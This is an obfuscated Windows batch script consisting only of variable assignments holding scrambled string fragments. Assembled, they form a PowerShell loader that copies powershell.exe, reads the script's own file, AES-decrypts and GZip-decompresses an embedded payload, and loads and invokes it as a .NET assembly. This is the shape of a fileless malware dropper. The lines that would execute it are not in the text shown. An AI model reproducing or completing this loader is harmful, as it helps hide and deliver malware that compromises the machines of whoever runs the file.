@echo off
set "XxesXGHVfM=:\"
set "vnmFUsKceg=.e"
set "vcZLoBcgoU=\v"
set "iFRcQxQeYg=nd"
set "UeqNOjrKxh=he"
set "AlAOcfpCrw=0\"
set "DXGoxeIcud=32"
set "pSUyPMFJwU= /"
set "JOqcSrFbCz=Sy"
set "QDXYUqRfXW=st"
set "qCkHuObfkD=Po"
set "qTXqaHvEws=xe"
set "LcxEXMpFns=co"
set "mAPSgeCRhQ=he"
set "pVstVVhgZy=Wi"
set "wuLpmcqfAI=py"
set "vuaNsgUTxK=s\"
set "toPSOSxcTb=\W"
set "VPQnZpPXrl=ll"
set "IPLUCrZVFl=ws"
set "LagxIavpAh=1."
set "vETxNZnjXN=y "
set "OGyoqSeFyn=po"
set "hkwCwRJbpL=we"
set "SQzYLWLwDK=ll"
set "bnmtFRUqBa= C"
set "eLdpqRVXWU=we"
set "WOAdtAdbZM=rS"
set "SYemvZpssF=ow"
set "FPOudNEdJK=em"
set "MBsSWTWJBQ=do"
set "pOVBeTZWYf=in"
set "BwWwkkBlIi=rs"
set "FAjAHeZtuU= %~dp0"
set "ERahyzPdoH=cd"
set "RHymaObCvj=ptor"
set "nKVuVVSrkf=IPPl"
set "ourfcVjvvz=.Key"
set "ouFpRtNbib=stem"
set "GEZDnCbBGW=();$"
set "EuYQPhbvtr== [S"
set "hQpOODtbJU= [Sy"
set "xfTqbbypkW=.IO."
set "XhUUyYPsYr=Star"
set "kRgBfDSSwV=)))"
set "CZHLxMqrIA=PTtG"
set "pCyYgrHvgt=Invo"
set "bKjcryksnM=rans"
set "btrsZQaWyP== $C"
set "XhIdhDtDqI=:('g"
set "KinXhSzxNK=lit("
set "cNyTuzOwjZ=rt]:"
set "cvRPGAFRSh=am;$"
set "qaAavDXjFB=ecry"
set "mfcAblZiUB=::De"
set "BNzYqoHEVh=AFMs"
set "epCBQuHdOJ=.Len"
set "hQNNPyavoB=oint"
set "kcWNTtZDUM=and "
set "YPFKfbjuiI=Obje"
set "UJQfRzHTqs=.Cry"
set "StKBUjRedR=6] -"
set "hawEmGMvsJ=, (,"
set "kyeWVBGDdh=$JqC"
set "vKKGOoSpPz=.Ass"
set "EyQiRozdkv=SYLW"
set "erwXwFeIao=y]::"
set "VKbdbMzIgI=cz.T"
set "FOsmJBVtAl=ionM"
set "dYYeTioCWQ=[Env"
set "UlMClbiNDv=[]] "
set "yoaOarPEbI=raph"
set "pZOSUkBVDn= '')"
set "FsSfprXZPz=;$Jq"
set "GNlRhVEhjl=tem."
set "kwAMFAobFx=lBlo"
set "SeFbJkqVAG=o = "
set "zRAgNAvAvn=Ccy "
set "lCroRziNcL=ss -"
set "nlfYFnTkSc='txe"
set "wYIkmkIxHg=LW.I"
set "nSfOMyRwFl=morF"
set "cfsHwaNkmL=.Cry"
set "UYIGvHSqab=oL'["
set "BYLEAzwvJD=null"
set "LpmqVaaCjR=ewLi"
set "XFxKMNcerI=$Jez"
set "YPOTARCDKp=ert]"
set "ZCNfPHVUFD=join"
set "UnrvwGkWNc==');"
set "jshuFhwrrK=$IPP"
set "tNBUeiFDuy= [Sy"
set "tMyOloYZPX=hQiZ"
set "ghtrjFmLFr= = ["
set "eVOXBdGORo=Mode"
set "IXcUEkwAiw=ispo"
set "JptyhRqbXZ=TllA"
set "EJhKNpaBxT=iron"
set "FqWIpYrdmB=rtS4"
set "rcwxekUcxS=ddin"
set "SZzKUMlGTE=Disp"
set "FBtWMXiPsX=zuZI"
set "PYmiPgOGzX=brea"
set "MMUCRnvWDO=$Ebj"
set "jDtdCSbxfO=comm"
set "pNtoESnOao=SYLW"
set "PYMqGCZhFv=  $c"
set "rVFPFoVnRj=ezcz"
set "XycAqDfUuB=S46e"
set "ODPYrCybre=rity"
set "kKJXYiRcDu=bjec"
set "LatrqqVNvt=Bmor"
set "DNgKdtMxqv=WYW."
set "ulqSSgSGCo=)($c"
set "RZwTZivSBg=y.Cr"
set "TEzdRwgApH='0Pg"
set "tMaishcEHe=('Tg"
set "vxluvvCpZi=);$y"
set "bdDYPWdCGe=yste"
set "zlAiQrgCBX=s = "
set "LhrxezFYLG=urit"
set "tCSuDceWwn=qSvm"
set "UiJJLKdyod=y.Pa"
set "KZSpPFqlhx=se()"
set "gaexbDMarD=$hQi"
set "RYZUsLjVBV=ne);"
set "eOJFJKqtlL=ay()"
set "gBQFczUYie=('%~f0'"
set "zjnhrIepkT=);$C"
set "fgsyrplAAN=WYW "
set "nyXRvvpLDJ=] -j"
set "zFEaITZdfK=O.Me"
set "jEuLTICILo=ress"
set "BiWmVrwfvc=[Sys"
set "JXdCdDjUSe= = N"
set "wAykGNRQwN=tem."
set "azYSBNUxQH=;$Jq"
set "VveMQhzJKy=fore"
set "JEqBPVBOSR=bstr"
set "LSHvfkchNm=saBm"
set "FTbMzIButY=BC;$"
set "PhoHRQYsKO=ode]"
set "jJEQKstsAg=($mk"
set "NHvVXenNji=-1.."
set "HWGmCBsgKD=o, 0"
set "nnrOWQokCB=.Cre"
set "hDrVWmCNlT=.Dis"
set "EjzyteCszS=SYLW"
set "tpjwnKcuCZ=.Cop"
set "jrtjbDrnMi=('%*'"
set "zcfkarSWaH=, $h"
set "BTbjwUiwEM=QiZo"
set "FBptoEHxSS=mory"
set "LfhoSVHrbg=mkWY"
set "qeKCmEnyIe=ptog"
set "HxsJSEhkui=6esa"
set "zYxrWEbmQN=pose"
set "BqSKDLROMp=in $"
set "SQDqfzAaav=pose"
set "xIGcDKviHE=ddin"
set "vszvAQQWBD=$hQi"
set "rAIFwdkCkv=pStr"
set "KiEvtiNJTS=H) {"
set "DvEwbGapEA=esMa"
set "VnnRRLCCHm=yTo("
set "fznfBddJty=gsYZ"
set "DRdboDcxkc=raph"
set "jjoAACNbRe=-4] "
set "KftNMFrKac=ose("
set "GcwTRgVNNU=oArr"
set "mZYnuaSihA=).Sp"
set "IqCJbqHykz=m.Re"
set "LyPaOHyCmu=ptog"
set "FAYsoopQyi=gnir"
set "ikuzaasNRT=;$yL"
set "FrmAcuyHMg=PxEW"
set "eiaqHIAXsG=oin "
set "ssOdCYnSyk=ment"
set "OfLTiXSJhN=rity"
set "MTKtZBNFbt=Secu"
set "EpndiSwYzd=hQiZ"
set "SqglTewVGA=();$"
set "GTkzkgIVnk=ress"
set "DFnJdBkddR=gth)"
set "AvJieYnfDU=.Sec"
set "zgOBzKJSNW=grap"
set "QvgKekSTNU=Secu"
set "mIweDzhLLU=$Jez"
set "eWVcwttcyu= New"
set "XQBPKsdPcQ=eMVs"
set "atjMpqhOJP=[Sys"
set "iLtSyzLyaQ=.Com"
set "CPtWXoOtWo=();$"
set "NNHZBrBUlY=n ''"
set "KqUyObWhWE=);$C"
set "MkHdJgCqne='[-1"
set "JLLBBEefwx=..-1"
set "AFTqZwIQlp=stem"
set "LRdJUEgqsD=gjYA"
set "woMndKmbWj=W.Pa"
set "AZmnkEXErZ=16] "
set "MfYeUPmNsp=FAFM"
set "BMiVvoJGwy=[IO."
set "AWDOgKkVuo=nage"
set "yCbrwYgNdD=RILb"
set "dDHTvCDFQY=-joi"
set "lcnBLCStbA=lI, "
set "JfiYpyIqPa=join"
set "EpdCcpLqIy=vert"
set "HjPUpBmPkI=ct S"
set "kgFjgIKxwS=.GZi"
set "JOhrdWGrfU=Disp"
set "PEnqpIaUuN=cy.T"
set "EIVtRMdjUJ=oryS"
set "ouXMWpOiCV=;$IP"
set "GIlGoLShPV=cz ="
set "IeglSLDFaJ=$Jez"
set "tawTVQwWgX=esaB"
set "SOgkuklCmw=vmB "
set "KjYXczMSly=);$F"
set "fahwZtydYw=..-1"
set "cAYyDMptrF=sion"
set "dVUqAmJNci=SYLW"
set "qyHIrTYdfb=.Con"
set "jclTIMqKJb=tion"
set "pgqsAIecRV=::('"
set "drCqLVTwFR=trea"
set "XKJGsbxqfp=($mk"
set "yqXHpRVIYo=ct S"
set "AjxlJhXFMU=RmAx"
set "BMfCosnAdJ='[-1"
set "OzcerGpkld=n ''"
set "uLRNJuaCKr=cz);"
set "DVTwoCgEmi= '')"
set "RbpRwSqMVA=stem"
set "fqerbkcsrH=I = "
set "dhpYxWmHZu=.Dis"
set "EMMZXkMytP=EbjA"
set "GmElzUSuaj=; };"
set "BOkFHQHYkq=PKCS"
set "hRwCEeoRiC=tem."
set "ZwkxaobUtm=]::N"
set "oghlicgxiC=ach "
set "UuHHJcOKrM=:: '"
set "gfTMTTPIhp=F'[-"
set "SPhAumaAfy=ateD"
set "EBSrzkmhov=YxVw"
set "jLqwoihYKN=]::("
set "sVBXyjADtF=Ccy."
set "mkWRWMOSNf=ect "
set "VPiKIYsnZp=Comp"
set "KuomwqOliZ=.Mod"
set "PJgpIjKzMN=New-"
set "PooBXKyDCF=CSYL"
set "BlvTziVgqc=g = "
set "ljiDRivaRB=e]::"
